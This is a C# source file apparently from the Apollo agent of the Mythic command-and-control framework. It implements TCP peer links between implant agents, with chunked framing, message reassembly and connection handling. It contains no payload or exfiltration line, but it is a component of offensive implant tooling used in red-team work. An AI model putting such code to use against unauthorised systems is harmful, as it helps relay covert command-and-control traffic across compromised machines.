using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using AS = ApolloInterop.Structs.ApolloStructs;
using TTasks = System.Threading.Tasks;
using System.Net.Sockets;
using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;
using System.Xml.Linq;
using ApolloInterop.Utils;
using ApolloInterop.Structs.ApolloStructs;
using System.Net;
using System.Collections.Generic;

namespace Apollo.Peers.TCP
{
    public class TCPPeer : AI.Classes.P2P.Peer
    {
        private AsyncTcpClient _tcpClient = null;
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;
        private bool _connected = false;
        private string _currentMessageID = Guid.NewGuid().ToString();
        private readonly List<byte> _receiveBuffer = new();
        private readonly object _receiveLock = new();
        private const int FrameHeaderSize = 12;
        // Keep a complete frame within the TCP receive buffer.
        private const int ChunkSize = AI.Constants.IPC.SEND_SIZE - FrameHeaderSize;
        //private IntPtr _socketHandle = IntPtr.Zero;
        private Socket _client;
        private delegate void CloseHandle(IntPtr handle);
        //private CloseHandle _pCloseHandle;
        
        public TCPPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            C2ProfileName = "tcp";
            _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port);
            _tcpClient.ConnectionEstablished += OnConnect;
            _tcpClient.MessageReceived += OnMessageReceived;
            _tcpClient.Disconnect += OnDisconnect;
            //_pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
            _sendAction = (object p) =>
            {
                TcpClient c = (TcpClient)p;
                while (c.Connected && !_cts.IsCancellationRequested)
                {
                    // Check queue before waiting to avoid race condition
                    if (_senderQueue.IsEmpty)
                    {
                        _senderEvent.WaitOne();
                    }
                    while(!_senderQueue.IsEmpty && !_cts.IsCancellationRequested && c.Connected)
                    {
                        if (!_cts.IsCancellationRequested && c.Connected && _senderQueue.TryDequeue(out byte[] result))
                        {
                            UInt32 totalChunksToSend = (UInt32)(result.Length == 0 ? 1 : ((result.Length - 1) / ChunkSize) + 1);
                            DebugHelp.DebugWriteLine($"have {totalChunksToSend} chunks to send out");
                            bool sentAllChunks = true;
                            for(UInt32 currentChunk = 0; currentChunk < totalChunksToSend; currentChunk++)
                            {
                                int offset = checked((int)currentChunk * ChunkSize);
                                int chunkLength = Math.Min(ChunkSize, result.Length - offset);
                                if (!SendFrame(c, totalChunksToSend, currentChunk, result, offset, chunkLength))
                                {
                                    sentAllChunks = false;
                                    break;
                                }
                            }
                            if (sentAllChunks)
                            {
                                DebugHelp.DebugWriteLine($"finished sending data from _senderQueue");
                            }
                        }
                    }
                }
            };
        }

        private bool SendFrame(TcpClient client, UInt32 totalChunks, UInt32 currentChunk, byte[] source, int offset, int chunkLength)
        {
            byte[] frame = new byte[FrameHeaderSize + chunkLength];
            WriteUInt32BigEndian(frame, 0, (UInt32)chunkLength + 8);
            WriteUInt32BigEndian(frame, 4, totalChunks);
            WriteUInt32BigEndian(frame, 8, currentChunk);
            if (chunkLength > 0)
            {
                Buffer.BlockCopy(source, offset, frame, FrameHeaderSize, chunkLength);
            }

            try
            {
                DebugHelp.DebugWriteLine($"sending chunk {currentChunk}/{totalChunks} with size {chunkLength + 8}");
                // This task is the connection's sole writer. A synchronous write provides ordering
                // and backpressure instead of queuing concurrent writes during file transfer.
                client.GetStream().Write(frame, 0, frame.Length);
                return true;
            }
            catch (Exception ex)
            {
                DebugHelp.DebugWriteLine($"failed to write to TCP peer: {ex}");
                _cts.Cancel();
                _senderEvent.Set();
                TTasks.Task.Run(() =>
                {
                    try
                    {
                        client.Close();
                    }
                    catch
                    {
                        // The connection is already unusable; the read side will perform cleanup.
                    }
                });
                return false;
            }
        }

        public override bool Connected()
        {
            return _connected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_connected;
        }

        public void OnConnect(object sender, TcpMessageEventArgs args)
        {
            args.State = this;
            OnConnectionEstablished(sender, args);
            _sendTask = new TTasks.Task(_sendAction, args.Client);
            _sendTask.Start();
            _connected = true;
            _previouslyConnected = true;
            _client = args.Client.Client;
        }

        public void OnDisconnect(object sender, TcpMessageEventArgs args)
        {
            _cts.Cancel();
            args.Client.Close();
            _senderEvent.Set();
            if(_sendTask != null){
                _sendTask.Wait();
            }
            _connected = false;
            base.OnDisconnect(this, args);
        }

        public void OnMessageReceived(object sender, TcpMessageEventArgs args)
        {
            lock (_receiveLock)
            {
                _receiveBuffer.AddRange(args.Data.Data.Take(args.Data.DataLength));
                ProcessReceiveBuffer();
            }
        }

        private void ProcessReceiveBuffer()
        {
            while (_receiveBuffer.Count >= FrameHeaderSize)
            {
                UInt32 framedSize = ReadUInt32BigEndian(_receiveBuffer, 0);
                UInt32 totalChunks = ReadUInt32BigEndian(_receiveBuffer, 4);
                UInt32 currentChunk = ReadUInt32BigEndian(_receiveBuffer, 8);
                if (framedSize < 8 || framedSize - 8 > AI.Constants.IPC.SEND_SIZE || totalChunks == 0 || currentChunk >= totalChunks)
                {
                    DebugHelp.DebugWriteLine("discarding invalid TCP frame header");
                    _receiveBuffer.Clear();
                    return;
                }

                int payloadLength = (int)(framedSize - 8);
                int frameLength = FrameHeaderSize + payloadLength;
                if (_receiveBuffer.Count < frameLength)
                {
                    return;
                }

                byte[] data = _receiveBuffer.GetRange(FrameHeaderSize, payloadLength).ToArray();
                _receiveBuffer.RemoveRange(0, frameLength);
                DebugHelp.DebugWriteLine($"got chunk {currentChunk + 1}/{totalChunks} with size {framedSize}");
                UnwrapMessage((int)currentChunk + 1, (int)totalChunks, data);
            }
        }

        private void UnwrapMessage(int currentChunk, int totalChunks, byte[] data)
        {
            AS.IPCChunkedData chunkedData = new (id: _currentMessageID, chunkNum: currentChunk, totalChunks: totalChunks, data: data);
            lock (_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new ChunkedMessageStore<AS.IPCChunkedData>();
                    _messageOrganizer[chunkedData.ID].MessageComplete += DeserializeToReceiver;
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
            if (currentChunk == totalChunks)
            {
                _currentMessageID = Guid.NewGuid().ToString();
            }
        }

        private static void WriteUInt32BigEndian(byte[] buffer, int offset, UInt32 value)
        {
            buffer[offset] = (byte)(value >> 24);
            buffer[offset + 1] = (byte)(value >> 16);
            buffer[offset + 2] = (byte)(value >> 8);
            buffer[offset + 3] = (byte)value;
        }

        private static UInt32 ReadUInt32BigEndian(List<byte> buffer, int offset)
        {
            return ((UInt32)buffer[offset] << 24) |
                   ((UInt32)buffer[offset + 1] << 16) |
                   ((UInt32)buffer[offset + 2] << 8) |
                   buffer[offset + 3];
        }

        public override bool Start()
        {
            return _tcpClient.Connect();
        }

        public override void Stop()
        {
            _cts.Cancel();  // should then hit the OnDisconnect which does all the cleanup
            _client?.Close();
        }
    }
}
